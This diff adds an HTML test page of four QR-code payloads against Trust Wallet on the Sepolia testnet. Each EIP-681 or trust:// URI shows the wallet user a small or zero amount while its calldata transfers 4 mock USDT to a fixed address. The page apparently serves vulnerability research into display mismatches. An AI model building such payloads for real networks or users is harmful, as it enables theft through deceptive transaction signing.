@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>TW Attack — 4 Final Candidates (Sepolia)</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background: #0d1117; color: #e6edf3; padding: 16px; }
+    h1 { font-size: 22px; margin-bottom: 4px; color: #ff6b6b; }
+    .subtitle { font-size: 13px; color: #8b949e; margin-bottom: 20px; }
+    .variant { background: #161b22; border: 1px solid #30363d; border-radius: 12px; padding: 16px; margin-bottom: 16px; }
+    .variant h2 { font-size: 16px; margin-bottom: 4px; }
+    .variant .badge { display: inline-block; padding: 2px 8px; border-radius: 12px; font-size: 11px; font-weight: 600; margin-bottom: 8px; }
+    .badge-sep { background: #1f6feb22; color: #58a6ff; border: 1px solid #1f6feb44; }
+    .qr-img { width: 220px; height: 220px; display: block; margin: 8px auto; border-radius: 8px; background: white; padding: 8px; }
+    .uri-box { font-size: 11px; color: #8b949e; word-break: break-all; background: #0d1117; padding: 8px; border-radius: 6px; margin: 8px 0; font-family: monospace; }
+    .info { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin: 8px 0; }
+    .info div { background: #0d1117; padding: 6px 8px; border-radius: 6px; }
+    .info .label { font-size: 10px; color: #8b949e; text-transform: uppercase; }
+    .info .value { font-size: 14px; font-weight: 600; margin-top: 2px; }
+    .info .value.red { color: #ff6b6b; }
+    .info .value.green { color: #3fb950; }
+    .info .value.orange { color: #d29922; }
+    .attribution { text-align: center; font-size: 11px; color: #484f58; margin-top: 20px; }
+  </style>
+</head>
+<body>
+  <h1>⚠️ TW QR Attack — 4 Final Candidates</h1>
+  <p class="subtitle">Sepolia • Mock USDT: 0xf07a16.. • $0 per test • 4 USDT execution</p>
+
+  <div class="variant">
+    <span class="badge badge-sep">Sepolia</span>
+    <h2>V1: EIP-681 RAW — recipient=USDT, data only (no value, no amount)</h2>
+    <img class="qr-img" src="https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=ethereum%3A0xf07a16d28055D1e40E9c934628d043c8A9b2CabF%4011155111%3Fdata%3D0xa9059cbb000000000000000000000000bc74dacfe1d0cd43a31be72eb2c44876e549383a00000000000000000000000000000000000000000000000000000000003d0900" alt="QR V1" loading="lazy">
+    <div class="uri-box">ethereum:0xf07a16d28055D1e40E9c934628d043c8A9b2CabF@11155111?data=0xa9059cbb000000000000000000000000bc74dacfe1d0cd43a31be72eb2c44876e549383a00000000000000000000000000000000000000000000000000000000003d0900</div>
+    <div class="info">
+      <div>
+        <div class="label">📱 Display</div>
+        <div class="value orange">0 ETH / Contract Interaction</div>
+      </div>
+      <div>
+        <div class="label">⚡ Executes</div>
+        <div class="value green">4 USDT to 0xbc74..</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="variant">
+    <span class="badge badge-sep">Sepolia</span>
+    <h2>V2: EIP-681 RAW + value=0 — explicit zero ETH value</h2>
+    <img class="qr-img" src="https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=ethereum%3A0xf07a16d28055D1e40E9c934628d043c8A9b2CabF%4011155111%3Fvalue%3D0%26data%3D0xa9059cbb000000000000000000000000bc74dacfe1d0cd43a31be72eb2c44876e549383a00000000000000000000000000000000000000000000000000000000003d0900" alt="QR V2" loading="lazy">
+    <div class="uri-box">ethereum:0xf07a16d28055D1e40E9c934628d043c8A9b2CabF@11155111?value=0&data=0xa9059cbb000000000000000000000000bc74dacfe1d0cd43a31be72eb2c44876e549383a00000000000000000000000000000000000000000000000000000000003d0900</div>
+    <div class="info">
+      <div>
+        <div class="label">📱 Display</div>
+        <div class="value orange">0 ETH / Contract Interaction</div>
+      </div>
+      <div>
+        <div class="label">⚡ Executes</div>
+        <div class="value green">4 USDT to 0xbc74..</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="variant">
+    <span class="badge badge-sep">Sepolia</span>
+    <h2>V3: trust:// send — NO amount, address=RECIPIENT, data=ARGS_ONLY (no selector!)</h2>
+    <img class="qr-img" src="https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=trust%3A%2F%2Fsend%3Fasset%3Dc11155111_t0x0xf07a16d28055d1e40e9c934628d043c8a9b2cabf%26address%3D0xbc74daCFE1d0cd43a31BE72EB2C44876e549383a%26data%3D0x000000000000000000000000bc74dacfe1d0cd43a31be72eb2c44876e549383a00000000000000000000000000000000000000000000000000000000003d0900" alt="QR V3" loading="lazy">
+    <div class="uri-box">trust://send?asset=c11155111_t0x0xf07a16d28055d1e40e9c934628d043c8a9b2cabf&address=0xbc74daCFE1d0cd43a31BE72EB2C44876e549383a&data=0x000000000000000000000000bc74dacfe1d0cd43a31be72eb2c44876e549383a00000000000000000000000000000000000000000000000000000000003d0900</div>
+    <div class="info">
+      <div>
+        <div class="label">📱 Display</div>
+        <div class="value orange">unknown — wallet may prepend transfer selector</div>
+      </div>
+      <div>
+        <div class="label">⚡ Executes</div>
+        <div class="value green">4 USDT if wallet prepends selector</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="variant">
+    <span class="badge badge-sep">Sepolia</span>
+    <h2>V4: trust:// send — amount=1, data=FULL calldata (mismatch!)</h2>
+    <img class="qr-img" src="https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=trust%3A%2F%2Fsend%3Fasset%3Dc11155111_t0x0xf07a16d28055d1e40e9c934628d043c8a9b2cabf%26address%3D0xbc74daCFE1d0cd43a31BE72EB2C44876e549383a%26amount%3D1%26data%3D0xa9059cbb000000000000000000000000bc74dacfe1d0cd43a31be72eb2c44876e549383a00000000000000000000000000000000000000000000000000000000003d0900" alt="QR V4" loading="lazy">
+    <div class="uri-box">trust://send?asset=c11155111_t0x0xf07a16d28055d1e40e9c934628d043c8a9b2cabf&address=0xbc74daCFE1d0cd43a31BE72EB2C44876e549383a&amount=1&data=0xa9059cbb000000000000000000000000bc74dacfe1d0cd43a31be72eb2c44876e549383a00000000000000000000000000000000000000000000000000000000003d0900</div>
+    <div class="info">
+      <div>
+        <div class="label">📱 Display</div>
+        <div class="value red">1 USDT</div>
+      </div>
+      <div>
+        <div class="label">⚡ Executes</div>
+        <div class="value green">4 USDT if wallet uses data instead of building</div>
+      </div>
+    </div>
+  </div>
+
+  <p class="attribution">Scan each QR using Trust Wallet in-app scanner • Report what you see vs what executes</p>
+</body>
+</html>
